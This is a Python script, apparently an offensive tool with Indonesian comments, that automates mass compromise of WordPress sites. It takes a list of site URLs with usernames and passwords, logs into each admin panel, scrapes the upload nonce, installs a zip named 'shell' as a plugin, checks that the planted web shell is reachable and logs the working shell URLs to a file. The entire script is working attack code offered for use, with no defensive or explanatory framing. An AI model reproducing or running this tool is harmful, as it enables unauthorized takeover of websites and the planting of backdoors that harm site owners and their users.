import re
import sys
import requests
from random import choice
from string import ascii_lowercase

# Disable Warning https
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

logsukses = "shell.txt"
logfail = "failed.txt"

bener = "\033[32;1m[+]\033[0m "
salah = "\033[31;1m[-]\033[0m "
tambah = "\033[32;1m | \033[0m"
kontl = "\033[31;1m | \033[0m"

def uploadbackdoor(host, username, password, type, agent):
    sukses = open(logsukses, "a")
    gagal = open(logfail, "a")
    if host.endswith('/'):
        host = host[:-1]

    # Membuat URL lengkap untuk login
    login_url = host + '/wp-login.php'
    
    headers = {'user-agent': agent, 'Accept-Encoding': 'none'}
    payload = {'log': username, 'pwd': password, 'rememberme': 'forever', 'wp-submit': 'log In',
               'redirect_to': host + '/wp-admin/', 'testcookie': 1}
    uploaddir = (''.join(choice(ascii_lowercase) for i in range(7)))

    session = requests.Session()
    try:
        # Lakukan login ke halaman wp-login.php
        r = session.post(login_url, headers=headers, data=payload, allow_redirects=False, verify=False, timeout=120)
        if r.status_code == 200:
            print(bener + host + " Success")
        else:
            print(salah + host + " Failed")
            gagal.write(host + " -> Fail Login\n")
            print("\n")
            return  # Keluar dari fungsi jika gagal login

        # Lanjutkan dengan upload shell setelah login berhasil
        r3 = session.get(host + '/wp-admin/plugin-install.php?tab=upload', headers=headers, verify=False, timeout=120)
        if r3.status_code == 200:
            look_for = 'name="_wpnonce" value="'
            try:
                nonceText = r3.text.split(look_for, 1)[1]
                nonce = nonceText[0:10]
                print(tambah + "WPNonce : " + nonce)
            except:
                print(kontl + "WPNonce : Fail Get nonce :(")
                gagal.write(host + " -> Fail Get nonce\n")
                return  # Keluar dari fungsi jika gagal mendapatkan nonce
              
            try:
                files = {'pluginzip': (uploaddir + '.zip', open(type + '.zip', 'rb')),
                         '_wpnonce': (None, nonce),
                         '_wp_http_referer': (None, host + '/wp-admin/plugin-install.php?tab=upload'),
                         'install-plugin-submit': (None, 'Install Now')}
                r4 = session.post(host + "/wp-admin/update.php?action=upload-plugin", headers=headers, files=files,
                                  verify=False, timeout=120)
                if r4.status_code == 200:
                    print(tambah + "Success Upload Shell")
                    if "Plugin installed successfully" in r4.text:
                        print(tambah + "Respone : Plugin installed successfully")
                    if "Destination folder already exists" in r4.text:
                        print(kontl + "Respone : Destination folder already exists")
                    
                    # Memeriksa apakah file shell telah berhasil diunggah
                    check_url = host + "/wp-content/plugins/not/includes/about.php"
                    check_response = session.get(check_url, headers=headers, verify=False, timeout=10)
                    if check_response.status_code == 200:
                        print(tambah + "Shell Accessible: " + check_url)
                        sukses.write(check_url + "\n")
                    else:
                        print(kontl + "!! Failed !! , Silahkan MengUpload Secara Manual !!")
                        gagal.write(host + " -> Failed to Accss Shell\n")
                print("\n")
            except Exception as e:
                print(salah + host)
                print(kontl + "Error : " + str(e))
                gagal.write(host + " -> " + str(e) + "\n")
                print("\n")
    except Exception as e:
        print(salah + host)
        print(kontl + "Error : " + str(e))
        gagal.write(host + " -> " + str(e) + "\n")
        print("\n")


def main():
    try:
        filename = input("Masukkan nama file list URL Wordpress: ")
        with open(filename, "r") as file:
            for line in file:
                line = line.strip()  # Hapus karakter whitespace tambahan
                # Compile regex pattern for URL and credentials
                pLogin = re.compile('http(.*)/wp-login.php#(.*)@(.*)')
                if re.findall(pLogin, line):
                    dataLogin = re.findall(pLogin, line)
                    domain = 'http' + dataLogin[0][0]
                    user = dataLogin[0][1]
                    password = dataLogin[0][2]
                    print("[*] Site : " + domain + "/")
                    print("[*] Username : " + user)
                    print("[*] Password : " + password)
                    
                    uploadbackdoor(domain, user, password, "shell", "Linux Mozilla 5/0")
                    
    except Exception as err:
        print("Error:", err)

# Panggil fungsi main saat script dijalankan
if __name__ == "__main__":
    main()
